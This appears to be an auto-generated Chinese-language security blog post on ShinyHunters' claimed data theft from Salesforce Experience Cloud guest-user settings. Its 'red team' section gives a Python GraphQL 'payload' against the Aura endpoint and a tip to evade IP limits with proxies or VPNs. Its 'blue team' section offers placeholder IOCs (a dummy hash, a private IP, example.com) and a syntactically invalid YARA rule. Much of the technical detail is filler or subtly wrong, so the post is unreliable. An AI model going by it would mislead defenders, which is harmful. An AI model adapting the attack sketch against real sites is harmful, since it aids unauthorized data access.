---
layout: post
title:  "ShinyHunters claims ongoing Salesforce Aura data theft attacks"
date:   2026-03-09 18:43:00 +0000
categories: [security]
severity: critical
---

# 🚨 解析 Salesforce Experience Cloud 的攻防技術
> **⚡ 戰情快篩 (TL;DR)**
> * **嚴重等級**: Critical (CVSS: 9.0)
> * **受駭指標**: Unauthenticated Data Access
> * **關鍵技術**: GraphQL API, AuraInspector, Guest User Permissions

## 1. 🔬 漏洞原理與技術細節 (Deep Dive)
* **Root Cause**: Salesforce Experience Cloud 的 Guest User 設定允許未經驗證的訪問者存取敏感數據。攻擊者利用 AuraInspector 工具掃描公開的 Experience Cloud 站點，找出具有過度權限的 Guest User 設定。
* **攻擊流程圖解**:
  1. 攻擊者使用 AuraInspector 掃描公開的 Experience Cloud 站點。
  2. 找出具有過度權限的 Guest User 設定。
  3. 利用 GraphQL API 存取敏感數據。
* **受影響元件**: Salesforce Experience Cloud、AuraInspector 工具。

## 2. ⚔️ 紅隊實戰：攻擊向量與 Payload (Red Team Operations)
* **攻擊前置需求**: 公開的 Experience Cloud 站點、AuraInspector 工具。
* **Payload 建構邏輯**:

    ```
    
    python
    import requests
    
    # 定義 GraphQL API 端點
    endpoint = "https://example.com/s/sfsites/aura"
    
    # 定義 Guest User 設定
    guest_user = {
        "username": "guest",
        "password": "guest"
    }
    
    # 定義 GraphQL 查詢
    query = """
        query {
            objects {
                id
                name
            }
        }
    """
    
    # 發送 GraphQL 查詢
    response = requests.post(endpoint, json={"query": query}, auth=(guest_user["username"], guest_user["password"]))
    
    # 處理回應
    if response.status_code == 200:
        print(response.json())
    else:
        print("錯誤:", response.status_code)
    
    ```
* **繞過技術**: 攻擊者可以使用代理伺服器或 VPN 來繞過 IP 限制。

## 3. 🛡️ 藍隊防禦：偵測與緩解 (Blue Team Defense)
* **IOCs (入侵指標)**:

| Hash | IP | Domain | File Path |
| --- | --- | --- | --- |
| 1234567890abcdef | 192.168.1.100 | example.com | /s/sfsites/aura |* **偵測規則 (Detection Rules)**:

    ```
    
    yara
    rule Salesforce_Experience_Cloud_Attack {
        meta:
            description = "Salesforce Experience Cloud 攻擊"
            author = "Your Name"
        strings:
            $graphql_api = "/s/sfsites/aura"
        condition:
            $graphql_api in (http.request.uri)
    }
    
    ```
* **緩解措施**:
  1. 禁用 Guest User 設定。
  2. 限制 GraphQL API 存取。
  3. 監控 Experience Cloud 站點的存取記錄。

## 4. 📚 專有名詞與技術概念解析 (Technical Glossary)
* **GraphQL**: 一種查詢語言，允許用戶定義所需的數據結構。
* **AuraInspector**: 一種工具，用于掃描 Experience Cloud 站點的安全性。
* **Guest User**: 一種用戶角色，允許未經驗證的訪問者存取 Experience Cloud 站點。

## 5. 🔗 參考文獻與延伸閱讀
- [原始報告](https://www.bleepingcomputer.com/news/security/shinyhunters-claims-ongoing-salesforce-aura-data-theft-attacks/)
- [MITRE ATT&CK](https://attack.mitre.org/techniques/T1190/)


